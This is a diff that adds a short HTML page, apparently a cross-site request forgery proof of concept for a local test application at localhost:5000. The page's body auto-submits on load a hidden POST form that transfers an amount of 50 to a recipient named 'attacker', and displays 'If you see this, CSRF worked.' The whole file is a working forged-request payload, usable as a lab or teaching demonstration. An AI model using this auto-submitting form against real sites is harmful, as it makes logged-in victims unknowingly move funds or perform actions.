@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit()">
+    <h2>If you see this, CSRF worked.</h2>
+    <form method="POST" action="http://localhost:5000/transfer">
+        <input type="hidden" name="to" value="attacker">
+        <input type="hidden" name="amount" value="50">
+    </form>
+</body>
+</html>
